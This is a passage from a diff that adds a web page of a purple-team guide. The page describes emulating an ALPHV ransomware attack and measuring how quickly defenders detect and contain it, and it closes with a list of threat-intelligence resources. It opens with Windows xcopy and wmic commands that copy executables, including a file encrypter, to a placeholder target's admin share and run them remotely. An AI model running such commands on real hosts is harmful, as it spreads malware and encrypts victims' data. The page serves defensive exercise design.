+xcopy /F /Y <span class="s2">"C:</span><span class="se">\p</span><span class="s2">rogramdata</span><span class="se">\s</span><span class="s2">etup.exe"</span> <span class="s2">"</span><span class="se">\\</span><span class="s2">TARGET_HOST_IP</span><span class="se">\C</span><span class="s2">$"</span>  
+cmd /c wmic /node:TARGET_HOST_IP process call create <span class="s2">"C:</span><span class="se">\s</span><span class="s2">etup.exe"</span>  
+
+<span class="c"># File encrypter malware execution</span>
+xcopy /F /Y <span class="s2">"C:</span><span class="se">\p</span><span class="s2">rogramdata</span><span class="se">\B</span><span class="s2">NUfUOmFT2.exe"</span> <span class="s2">"</span><span class="se">\\</span><span class="s2">TARGET_HOST_IP</span><span class="se">\C</span><span class="nv">$\</span><span class="s2">programdata"</span>
+cmd /c wmic /node:TARGET_HOST_IP process call create <span class="s2">"C:</span><span class="se">\p</span><span class="s2">rogramdata</span><span class="se">\B</span><span class="s2">NUfUOmFT2.exe p7BQXbycbpiH -QnA -4Nc -gd -A -4heGxsuj -yreVf -91nHs -9eGxd -etRzp6kw -gzfW3"</span>
+</code></pre></div></div>
+<h4 id="the-test-suite">The Test Suite</h4>
+<figure>
+<img src="/assets/images/4/summary-0.png" style="width: 75%" title="Figure 4-3" />
+<figcaption>Figure 4-3: The techniques to be executed in a purple team scenario, from the initial access phase through credential access</figcaption>
+</figure>
+<figure>
+<img src="/assets/images/4/summary-1.png" style="width: 75%" title="Figure 4-4" />
+<figcaption>Figure 4-4: The techniques to be executed at the conclusion of the purple team exercise, from credential access to ransomware deployment in the impact phase.</figcaption>
+</figure>
+<h4 id="data-to-capture">Data to Capture</h4>
+<h5 id="detection-aggregation-and-user-analytics">Detection Aggregation and User Analytics</h5>
+<figure>
+<img src="/assets/images/4/results-0.png" style="width: 75%" title="Figure 4-5" />
+<figcaption>Figure 4-5: The risk level increases as low-severity alerts are triggered.</figcaption>
+</figure>
+<h4 id="plotting-results">Plotting Results</h4>
+<h5 id="detection-and-containment-time">Detection and Containment Time</h5>
+<figure>
+<img src="/assets/images/4/ttc-0.png" style="width: 75%" title="Figure 4-6" />
+<figcaption>Figure 4-6: A plot of time taken to detect and contain an attack, including the portion of the attack chain prevented</figcaption>
+</figure>
+<figure>
+<img src="/assets/images/4/ttc-1.png" style="width: 75%" title="Figure 4-7" />
+<figcaption>Figure 4-7: An example plot with data points for detection and prevention across an exercise</figcaption>
+</figure>
+<h5 id="exercise-comparisons">Exercise Comparisons</h5>
+<figure>
+<img src="/assets/images/4/ttc-2.png" style="width: 75%" title="Figure 4-8" />
+<figcaption>Figure 4-8: Two exercise outcomes plotted together to articulate a change in defensive performance</figcaption>
+</figure>
+<hr />
+<h2 id="resources">Resources</h2>
+<p>The following resources expand on topics covered in this chapter.
+<br />
+<br /></p>
+<h4 id="generating-test-cases-1">Generating Test Cases</h4>
+<div class="row row-cols-1 row-cols-md-1">
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>A writeup from the DFIR Report of an ALPHV ransomware attack</h6>
+               <p><i>"IcedID Brings ScreenConnect and CSharp Streamer to ALPHV Ransomware Deployment" Accessed June 10, 2024</i></p>
+                <a target="_blank" href="https://thedfirreport.com/2024/06/10/icedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+</div>
+<h4 id="initial-access-and-execution-1">Initial Access and Execution</h4>
+<div class="row row-cols-1 row-cols-md-1">
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>A sandbox execution of the original VBS script used as part of the initial access phase of the ALPHV ransomware attack</h6>
+               <p><i>"Analysis Document [2023.10.11_08-07]_5.vbs" Accessed August 24, 2024</i></p>
+                <a target="_blank" href="https://app.any.run/tasks/cb8ef3f3-5d25-46cf-a6da-26712b04bb0c/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+</div>
+<h4 id="discovery-1">Discovery</h4>
+<div class="row row-cols-1 row-cols-md-1">
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Details of the ports used by the Veeam software, targeted for port scanning as part of the emulated discovery activities</h6>
+               <p><i>"Ports: Veeam Agent Management Guide" Accessed August 24, 2024</i></p>
+                <a target="_blank" href="https://helpcenter.veeam.com/docs/backup/agents/used_ports.html" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+</div>
+<h4 id="command-and-control-1">Command and Control</h4>
+<div class="row row-cols-1 row-cols-md-1">
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Details of the features of Cobalt Strike's malleable profile and how it can be customized</h6>
+               <p><i>Chris Navarrete, Durgesh Sangvikar, Andrew Guan, Yu Fu, Yanhui Jia, Siddhart Shibiraj, "Cobalt Strike Analysis and Tutorial: How Malleable C2 Profiles Make Cobalt Strike Difficult to Detect" March 16, 2022</i></p>
+                <a target="_blank" href="https://unit42.paloaltonetworks.com/cobalt-strike-malleable-c2-profile/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+</div>
+<h4 id="lateral-movement-1">Lateral Movement</h4>
+<div class="row row-cols-1 row-cols-md-1">
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>An analysis of Impacket scripts and the indicators that can be used for effective detection</h6>
+               <p><i>Riccardo Ancarani, "Hunting for Impacket," 10 May, 2020</i></p>
+                <a target="_blank" href="https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+</div>
+<h4 id="credential-access">Credential Access</h4>
+<div class="row row-cols-1 row-cols-md-1">
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Operational security consideration for using Cobalt Strike's beacon commands</h6>
+               <p><i>"Beacon Command Behavior and OPSEC Considerations," Forta, Accessed August 24, 2024</i></p>
+                <a target="_blank" href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/appendix-a_beacon-opsec-considerations.htm" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+</div>
+<h4 id="collection">Collection</h4>
+<div class="row row-cols-1 row-cols-md-1">
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Snaffler, a popular post-exploitation tool for identifying and gathering sensitive information, such as credential material, from network shares</h6>
+               <p><i>"Snaffler," Accessed September 15, 2024</i></p>
+                <a target="_blank" href="https://github.com/SnaffCon/Snaffler" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+</div>
+<h4 id="impact-1">Impact</h4>
+<div class="row row-cols-1 row-cols-md-1">
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>Different methods of encryptions used in ransomware execution</h6>
+               <p><i>Yimi Hu, "A brief summary of encryption method used in widespread ransomware," Infosec Institute, January 13, 2017</i></p>
+                <a target="_blank" href="https://www.infosecinstitute.com/resources/cryptography/a-brief-summary-of-encryption-method-used-in-widespread-ransomware" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+</div>
+<h4 id="creating-custom-tooling">Creating Custom Tooling</h4>
+<div class="row row-cols-1 row-cols-md-1">
+   <div class="col mb-4">
+       <div class="card">
+           <div class="card-body">
+               <h6>An overview of CSharp Streamer and its capabilities</h6>
+               <p><i>Hendrik Eckardt, "The csharp-streamer RAT," cyber.wtf, December 6, 2023</i></p>
+                <a target="_blank" href="https://cyber.wtf/2023/12/06/the-csharp-streamer-rat/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
+           </div>
+       </div>
+   </div>
+</div>
+<div class="container">
+ <div class="row">
+   <div class="col" style="text-align: left">
+      <a href="/part-I/the-atomic-methodology/" class="btn btn-primary">&lt;&lt; Chapter 3</a>
+   </div>
+   <div class="col" style="text-align: right">
+      <a href="/part-II/environment-setup/" class="btn btn-primary">Chapter 5 &gt;&gt;</a>
+   </div>
+ </div>
+</div>
+			</article>
+		</div>
+	</main>
+		<!-- Footer -->
+ <footer class="footer-chulapa text-center mt-0 pt-3">
+   <div class="container">
+     <div class="row">
+       <div class="col-xl-10 offset-xl-1"><div role="navigation" class="d-flex flex-wrap justify-content-center"><a href="https://github.com/orgs/aguidetopurpleteaming" title="footerRepo on Github" class="chulapa-footer-sociallink lead"><span class="fa-stack fa-lg" aria-hidden="true">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+              </span><span class="sr-only">Repo on Github</span>
+            </a></div><p class="mt-2 mb-3">&copy; 2025 ajpc500</p>
+          <!-- Do not remove this in order to give  attributions -->
+         <p class="chulapa-footer-brand">Powered by <a href="https://dieghernan.github.io/chulapa"> <span class="chulapa">Chulapa</span> Jekyll Theme</a><br><b>Lux</b> skin by <a href="https://bootswatch.com/">Bootswatch</a></p>
+          <!-- End  attributions -->
+       </div>
+     </div>
+ </div>
+</footer>
+<!-- Footer -->
+<!-- JS, Popper.js, and jQuery -->
+	<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+	<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
+	<script src="https://cdn.jsdelivr.net/gh/dieghernan/chulapa@master/assets/js/chulapa_script.js"></script>
+	<!-- start custom scripts to be placed at the bottom of the page -->
+<!-- end custom bottom scripts -->
+	</body>
+</html>
